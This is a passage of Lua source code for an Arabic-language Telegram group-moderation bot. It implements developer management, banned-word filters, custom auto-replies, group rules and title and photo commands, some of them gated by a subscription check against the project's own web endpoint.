if text:match("^اضف مطور (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(اضف مطور) (%d+)$")}
redis:set('SNIEBR:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
redis:sadd('SNIEBR:'..bot_id..'dev', apmd[2])
tsX000(apmd[2],msg,'🔖┇تم رفعة مطور في البوت')
end

if text:match("^حذف مطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end

function demote_by_reply(extra, result, success)
if not redis:sismember('SNIEBR:'..bot_id..'dev', result.sender_user_id_) then
tsX000("prore",msg,'بالفعل تم تنزيلة من مطورين البوت')
else
redis:del('SNIEBR:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
redis:srem('SNIEBR:'..bot_id..'dev', result.sender_user_id_)
tsX000("prore",msg,'تم تنزيلة من مطورين البوت')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end

if text:match("^حذف مطور @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
redis:del('SNIEBR:'..bot_id..'sudoo'..result.id_..'', 'no')
redis:srem('SNIEBR:'..bot_id..'dev', result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n┇ تم تنزيلة من مطورين البوت  👨🏼‍🔧'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end  
if text:match("^حذف مطور (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
redis:del('SNIEBR:'..bot_id..'sudoo'..apmd[2]..'', 'no')
redis:srem('SNIEBR:'..bot_id..'dev', apmd[2])
tsX000(apmd[2],msg,'☑┇ تم تنزيله من مطورين البوت')
end
if text == "مسح قائمه المنع" and (is_mod(msg) or is_creatorbasic(msg)) then  
local list = datahmade:smembers('SNIEBR:'..bot_id.."repmedia"..msg.chat_id_)  
for k,v in pairs(list) do  
datahmade:del('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
datahmade:del('SNIEBR:'..bot_id.."add:reply:rd"..v..msg.chat_id_)  
datahmade:srem('SNIEBR:'..bot_id.."repmedia"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_, 1, "🔖┇ تم مسح قائمه المنع بنجاح \n", 1, 'md')  
end

if text == "قائمه المنع" and (is_mod(msg) or is_creatorbasic(msg)) then  
local list = datahmade:smembers('SNIEBR:'..bot_id.."repmedia"..msg.chat_id_)  
t = "⚠┇قائمة الكلمات الممنوعه ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local taha = datahmade:get('SNIEBR:'..bot_id.."add:reply:rd"..v..msg.chat_id_)   
t = t..''..k..'- '..v..' » {'..taha..'}\n'    
end  
if #list == 0 then  
t = "📬┇ لا يوجد ردود مضافه"  
end  
send(msg.chat_id_, msg.id_, 1, t, 1, 'html')  
end  

if text and text == 'منع'  and (is_mod(msg) or is_creatorbasic(msg)) then   
send(msg.chat_id_, msg.id_, 1, '📥┇ ارسل الكلمه المراد حذفها الان \n', 1, 'md')  
datahmade:set('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = datahmade:get('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == 'rep' then   
send(msg.chat_id_, msg.id_, 1, "📥┇ ارسل تحذير عند ارسال الكلمه \n", 1, 'md')  
datahmade:set('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"repp")  
datahmade:set('SNIEBR:'..bot_id.."add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
datahmade:sadd('SNIEBR:'..bot_id.."repmedia"..msg.chat_id_,text)  
return false  end  
end
if text == 'الغاء منع' and (is_mod(msg) or is_creatorbasic(msg)) then   
send(msg.chat_id_, msg.id_, 1, '📥┇ ارسل الكلمه المراد حذفها من قائمه المنع \n', 1, 'md')  
datahmade:set('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = datahmade:get('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == 'reppp' then   
send(msg.chat_id_, msg.id_, 1, "📮┇ تم الغاء منعها من قائمه المنع \n", 1, 'md')  
datahmade:del('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
datahmade:del('SNIEBR:'..bot_id.."add:reply:rd"..text..msg.chat_id_)  
datahmade:srem('SNIEBR:'..bot_id.."repmedia"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = datahmade:get('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
if test == 'repp' then  
send(msg.chat_id_, msg.id_, 1, '🔖┇تم منع الكلمه لن يتم ارسالها بعد الان  \n', 1, 'md')  
datahmade:del('SNIEBR:'..bot_id.."add:reply1"..msg.sender_user_id_..msg.chat_id_)  
local test = datahmade:get('SNIEBR:'..bot_id.."add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
datahmade:set('SNIEBR:'..bot_id.."add:reply:rd"..test..msg.chat_id_, text)  
end  
datahmade:del('SNIEBR:'..bot_id.."add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end
if text and (not is_mod(msg) or not is_creatorbasic(msg)) then  
local taha = datahmade:get('SNIEBR:'..bot_id.."add:reply:rd"..text..msg.chat_id_)   
if taha then    
function get_info(arg,data)
if data.username_ ~= false then
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛┇["..taha.."] \n" , 1, 'md') 
else
send(msg.chat_id_,0, 1, "⚠┇العضو : {["..data.first_name_.."](T.ME/SNIEBR)}\n📛┇["..taha.."] \n" , 1, 'md') 
end
end
getUser(msg.sender_user_id_,get_info)
delete_msg(msg.chat_id_, {[0] = msg.id_}) 
return false   
end    
end
if text:match("^حذف رد$") and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '📜※ ارسل الكلمة التي تريد حذفها ✓', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'nomsg')
return false end
if text:match("^(.*)$") then
local keko1 = redis:get('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
if keko1 == 'nomsg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
redis:del('SNIEBR:'..bot_id..'keko'..text..''..msg.chat_id_..'')
redis:del('SNIEBR:'..bot_id..':sticker:'..text..''..msg.chat_id_..'')
redis:del('SNIEBR:'..bot_id..':voice:'..text..''..msg.chat_id_..'')
redis:del('SNIEBR:'..bot_id..':video:'..text..''..msg.chat_id_..'')
redis:del('SNIEBR:'..bot_id..':gif:'..text..''..msg.chat_id_..'')
redis:del('SNIEBR:'..bot_id..':file:'..text..''..msg.chat_id_..'')
redis:srem('SNIEBR:'..bot_id..'kekore'..msg.chat_id_..'', text)
return false
end
end
if text:match("^اضف رد للكل$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد اضافتها ', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'', 'msg')
return false end
local keko1 = redis:get('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'')
if keko1 == 'msg' and text then
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'', 're')
redis:set('SNIEBR:'..bot_id..'msg'..msg.sender_user_id_..'', text)
return false end
if text:match("^حذف رد للكل$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد حذفها ' , 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'', 'nomsg')
return false end
if text:match("^(.*)$") then
local keko1 = redis:get('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'')
if keko1 == 'nomsg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الرد', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..'', 'no')
redis:del('SNIEBR:'..bot_id..':sticker:'..text)
redis:del('SNIEBR:'..bot_id..':voice:'..text)
redis:del('SNIEBR:'..bot_id..':video:'..text)
redis:del('SNIEBR:'..bot_id..':gif:'..text)
redis:del('SNIEBR:'..bot_id..':file:'..text)
redis:del('SNIEBR:'..bot_id..'keko'..text)
redis:srem('SNIEBR:'..bot_id..'kekoresudo', text)
end
end
if text:match("^اضف رد$") and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '📜┇ ارسل الكلمة التي تريد اضافتها ', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local keko1 = redis:get('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
if keko1 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '📥┇الان ارسل الرد الذي تريد اضافته \n📥┇ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n☑┇ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات  ', 1, 'md')
redis:set('SNIEBR:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 're')
redis:set('SNIEBR:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'', text)
redis:sadd('SNIEBR:'..bot_id..'repowner'..msg.sender_user_id_..''..msg.chat_id_..'', text)
return false end
end
if not end032 then 
end

if text and not datahmade:get('SNIEBR:'..bot_id..'repowner:mute'..msg.chat_id_) then
local keko = redis:get('SNIEBR:'..bot_id..'keko'..text..''..msg.chat_id_..'')
if keko then 
function keko_SNIEBR_re(t1,t2)
local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = ((datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local t = ""
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي '
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز'
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
end
local keko = keko:gsub('#username',(t2.username_ or 'لا يوجد')) 
local keko = keko:gsub('#name',(t2.first_name_ or 'لا يوجد'))
local keko = keko:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local keko = keko:gsub('#edit',(edit or 'لا يوجد'))
local keko = keko:gsub('#msgs',(user_msgs or 'لا يوجد'))
local keko = keko:gsub('#stast',(t or 'لا يوجد'))
print('&&')
send(msg.chat_id_, msg.id_, 1, keko, 1, 'md')
end
getUser(msg.sender_user_id_, keko_SNIEBR_re)
end
if (redis:get('SNIEBR:'..bot_id..':sticker:'..text..''..msg.chat_id_..'')) then 
tdcli.sendSticker(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':sticker:'..text..''..msg.chat_id_..''))
end
if (redis:get('SNIEBR:'..bot_id..':voice:'..text..''..msg.chat_id_..'')) then 
tdcli.sendVoice(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':voice:'..text..''..msg.chat_id_..''))
end
if (redis:get('SNIEBR:'..bot_id..':video:'..text..''..msg.chat_id_..'')) then 
tdcli.sendVideo(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':video:'..text..''..msg.chat_id_..''))
end
if (redis:get('SNIEBR:'..bot_id..':gif:'..text..''..msg.chat_id_..'')) then 
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':gif:'..text..''..msg.chat_id_..''))
end
if (redis:get('SNIEBR:'..bot_id..':file:'..text..''..msg.chat_id_..'')) then
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':file:'..text..''..msg.chat_id_..''))
end  
end

if not datahmade:get('SNIEBR:'..bot_id..'repsudo:mute'..msg.chat_id_) then
local keko = redis:get('SNIEBR:'..bot_id..'keko'..text..'')
if keko then 
function keko_SNIEBR_re(t1,t2)
local tahna = (datahmade:get('SNIEBR:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = ((datahmade:get('SNIEBR:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_) or 0) + tahna)
local edit = datahmade:get('SNIEBR:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local t = ""
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = datahmade:get("SNIEBR:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
elseif is_creatorbasic(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = datahmade:get("SNIEBR:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب '
elseif (datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("SNIEBR:all_if:"..datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = datahmade:get("SNIEBR:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = datahmade:get("SNIEBR:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
elseif is_mod(msg) then
t = datahmade:get("SNIEBR:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب'
elseif is_vip(msg) then
t = datahmade:get("SNIEBR:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز '
else
t = datahmade:get("SNIEBR:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط ' 
end
keko = keko:gsub('#username',(t2.username_ or 'لا يوجد'))
keko = keko:gsub('#name',(t2.first_name_ or 'لا يوجد'))
keko = keko:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
keko = keko:gsub('#edit',(edit or 'لا يوجد'))
keko = keko:gsub('#msgs',(user_msgs or 'لا يوجد'))
keko = keko:gsub('#stast',(t or 'لا يوجد'))
send(msg.chat_id_, msg.id_, 1, keko, 1, 'html')
end
getUser(msg.sender_user_id_, keko_SNIEBR_re)
end
if (redis:get('SNIEBR:'..bot_id..':sticker:'..text)) then 
tdcli.sendSticker(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':sticker:'..text))
end
if (redis:get('SNIEBR:'..bot_id..':voice:'..text)) then 
tdcli.sendVoice(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':voice:'..text))
end
if (redis:get('SNIEBR:'..bot_id..':video:'..text)) then 
tdcli.sendVideo(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':video:'..text))
end
if (redis:get('SNIEBR:'..bot_id..':gif:'..text)) then 
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':gif:'..text))
end
if (redis:get('SNIEBR:'..bot_id..':file:'..text)) then
tdcli.sendDocument(chat_id, msg.id_, 0, 1, nil, redis:get('SNIEBR:'..bot_id..':file:'..text))
end  
end

if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then 
if text and text == "اضف تفاعل" then 
send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
datahmade:set("keko:set:ttt:p"..bot_id..msg.sender_user_id_,true)
return "keko"
end 
if text and datahmade:get("keko:set:ttt:p"..bot_id..msg.sender_user_id_) then 
send(msg.chat_id_, msg.id_, 1, '📥┇اراسل لان النص الذي يضهر', 1, 'md')
datahmade:set("keko:set:ttt:p2"..bot_id..msg.sender_user_id_,true)
datahmade:set("keko:set:ttt:ppp:"..bot_id..msg.sender_user_id_,text)
datahmade:del("keko:set:ttt:p"..bot_id..msg.sender_user_id_)
return "keko"
end
if text and datahmade:get("keko:set:ttt:p2"..bot_id..msg.sender_user_id_) then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم الحفط', 1, 'md')
keko = datahmade:get("keko:set:ttt:ppp:"..bot_id..msg.sender_user_id_)
datahmade:sadd("keko:all:pppp:tt:"..bot_id,keko)
datahmade:set("keko:set:text:p"..bot_id..keko,text)
datahmade:del("keko:set:ttt:p2"..bot_id..msg.sender_user_id_)
return "keko"
end 
if text and (text == "التفاعلات" or text == "قائمه التفاعلات" and end032 ) then 
keko = datahmade:smembers('keko:all:pppp:tt:'..bot_id) or 0
text23p = '📊┇كلمات التفاعل : \n\n'
if (not keko or not keko[1]) then 
send(msg.chat_id_, msg.id_, 1, "📊┇لا يوجد", 1, 'html')
return "keko"
end
for i=1, #keko do
local tttee = datahmade:get("keko:set:text:p"..bot_id..keko[i])
text23p = text23p.."|"..i.."| ~⪼ "..keko[i].." | "..tttee.."\n"
end
send(msg.chat_id_, msg.id_, 1, text23p ,1, 'html')
end
if text and text == "مسح قائمه التفاعلات" then 
send(msg.chat_id_, msg.id_, 1, "📊┇تم الحذف" ,1, 'html')
keko = datahmade:smembers('keko:all:pppp:tt:'..bot_id) or 0
for i=1, #keko do
datahmade:del("keko:set:text:p"..bot_id..keko[i])
end
datahmade:del('keko:all:pppp:tt:'..bot_id)
end
if text and text == "حذف تفاعل" then 
send(msg.chat_id_, msg.id_, 1, '📥┇ارسال لان عدد الرسال الذي يجب ان يكون اكثر منه', 1, 'md')
datahmade:set("keko:set:ttt:p:Del"..bot_id..msg.sender_user_id_,true)
return "keko"
end 
if text and datahmade:get("keko:set:ttt:p:Del"..bot_id..msg.sender_user_id_) then 
send(msg.chat_id_, msg.id_, 1, '📥┇اراسل لان التص الذي يضهر', 1, 'md')
datahmade:del("keko:set:text:p"..bot_id..text)
datahmade:srem('keko:all:pppp:tt:'..bot_id,text)
datahmade:del("keko:set:ttt:p:Del"..bot_id..msg.sender_user_id_)
return "keko"
end
end 

if text:match("^مسح المطورين$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local list = redis:smembers('SNIEBR:'..bot_id..'dev')
for k,v in pairs(list) do
redis:del('SNIEBR:'..bot_id..'dev')
redis:del('SNIEBR:'..bot_id..'sudoo'..v)
end
send(msg.chat_id_, msg.id_, 1, "┇ تم مسح قائمة المطورين  ", 1, 'md')
end
if text:match("^مسح ردود المدير$") and (is_owner(msg) or is_creatorbasic(msg)) then
local list = redis:smembers('SNIEBR:'..bot_id..'kekore'..msg.chat_id_..'')
for k,v in pairs(list) do
redis:del('SNIEBR:'..bot_id..'kekore'..msg.chat_id_..'', text)
redis:del('SNIEBR:'..bot_id..'keko'..v..''..msg.chat_id_)
redis:del('SNIEBR:'..bot_id..':sticker:'..v..msg.chat_id_)
redis:del('SNIEBR:'..bot_id..':voice:'..v..msg.chat_id_)
redis:del('SNIEBR:'..bot_id..':video:'..v..msg.chat_id_)
redis:del('SNIEBR:'..bot_id..':gif:'..v..msg.chat_id_)
redis:del('SNIEBR:'..bot_id..':file:'..v..msg.chat_id_)
redis:del('SNIEBR:'..bot_id..'keko'..v..msg.chat_id_)
end
send(msg.chat_id_, msg.id_, 1, "• `تم مسح ردود المدير` 🗑", 1, 'md')
end
if text:match("^مسح ردود المطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
local list = redis:smembers('SNIEBR:'..bot_id..'kekoresudo')
for k,v in pairs(list) do
redis:del('SNIEBR:'..bot_id..'kekoresudo', text)
redis:del('SNIEBR:'..bot_id..'keko'..v..'')
redis:del('SNIEBR:'..bot_id..':sticker:'..v)
redis:del('SNIEBR:'..bot_id..':voice:'..v)
redis:del('SNIEBR:'..bot_id..':video:'..v)
redis:del('SNIEBR:'..bot_id..':gif:'..v)
redis:del('SNIEBR:'..bot_id..':file:'..v)
redis:del('SNIEBR:'..bot_id..'keko'..v)
end
send(msg.chat_id_, msg.id_, 1, "☑┇تم مسح ردود المطور", 1, 'md')
end

if text:match("^المطورين$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local list = redis:smembers('SNIEBR:'..bot_id..'dev')
text = "👨🏿‍💻 ┇ قائمه المطورين   ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❗️┇ لا يوجد مطورين  "
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end


------------------------------------
if text:match("^ردود المطور$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add)  then
local list = redis:smembers('SNIEBR:'..bot_id..'kekoresudo')
text = "📑┇قائمه ردود المطور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
text = text.."<b>|"..k.."|</b>~⪼("..v..")\n"
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❕┇لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^ردود المدير$") and (is_owner(msg) or is_creatorbasic(msg)) then
local list = redis:smembers('SNIEBR:'..bot_id..'kekore'..msg.chat_id_..'')
text = "📑┇قائمه ردود المدير\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
text = text.."<b>|"..k.."|</b>~⪼("..v..")\n"
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "❕┇لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end

if text:match("^كرر (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(كرر) (.*)$")}
send(msg.chat_id_, msg.id_, 1, txt[2], 1, 'html')
end  
if text:match("^وضع قوانين (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(وضع قوانين) (.*)$")}
datahmade:set('SNIEBR:'..bot_id..'rules'..msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع القوانين للمجموعه", 1, 'md')
end
if text:match("^القوانين$") then
local rules = datahmade:get('SNIEBR:'..bot_id..'rules'..msg.chat_id_)
if rules then
send(msg.chat_id_, msg.id_, 1, '⚜┇قوانين المجموعه هي\n'..rules, 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '⚜┇لم يتم حفظ قوانين للمجموعه', 1, 'md')
end
end  
if not datahmade:get("group_edit:SNIEBR"..msg.chat_id_..bot_id) then
if (is_mod(msg) or is_creatorbasic(msg))   then
if text:match("^وضع اسم (.*)$")   then
local txt = {string.match(text, "^(وضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
send(msg.chat_id_, msg.id_, 1, '✔┇تم تحديث اسم المجموعه الى \n'..txt[2], 1, 'md')
end
if text:match("^وضع صوره")  then
datahmade:set('SNIEBR:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, 1, '♻️ ┇ قم بارسال صوره الان  ', 1, 'md')
end
if text:match("^مسح الصوره") then
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '🗑┇ تم مسح الصوره  ', 1, 'md')
end
if text:match("^وضع وصف (.*)$")  then
local text = {string.match(text, "^(وضع وصف) (.*)$")}
